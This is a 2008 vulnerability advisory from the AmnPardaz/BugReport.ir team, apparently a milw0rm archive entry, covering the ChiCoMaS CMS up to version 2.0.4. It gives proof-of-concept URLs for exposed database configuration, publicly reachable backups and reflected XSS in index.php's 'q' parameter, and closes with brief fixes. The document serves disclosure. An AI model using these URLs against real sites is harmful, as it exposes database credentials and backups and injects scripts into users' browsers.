@@ -1,0 +1,55 @@
+########################## www.BugReport.ir #########################
+#
+#      AmnPardaz Security Research Team
+#
+# Title:  chicomas <=2.0.4 Multiple Vulnerabilities
+# Vendor: http://www.chicomas.com/
+# Demo:   http://demo.opensourcecms.com/chicomas
+# Bug:    Database Information Disclosure, Authorization Weakness, XSS
+# Vulnerable Version: 2.0.4
+# Exploitation: Remote with browser
+# Fix: N/A
+# Original Advisory: http://www.bugreport.ir/index_59.htm
+###################################################################
+
+
+####################
+- Description:
+####################
+
+  ChiCoMaS is free web based Content Management System based on PHP & MySQL with Full featured WYSIWYG TinyMCE editor,
+File management with QuiXplorer, User and group administration to manage access permissions & Backup/Restore with integrated MySqlBackupPro.
+
+####################
+- Vulnerability:
+####################
+
++-->Dtabase Information Disclosure
+
+POC: http://[URL]/chicomas/config.inc
+
+
++-->The Latest generated Database backups
+
+POC: http://[URL]/chicomas/backup
+
+
++-->Cross Site Scripting (XSS). Reflected XSS attack in "index.php" in "q" parameter.
+
+POC: http://[URL]/chicomas/index.php?q="<script>alert(/www.BugReport.ir/.source)</script>
+
+####################
+- Solution:
+####################
+
+Restrict and grant only trusted users access to the resources. Edit the source code to ensure that inputs are properly sanitized.
+
+####################
+- Credit :
+####################
+AmnPardaz Security Research & Penetration Testing Group
+Contact: admin[4t}bugreport{d0t]ir
+www.BugReport.ir
+www.AmnPardaz.com
+
+# milw0rm.com [2008-12-21]
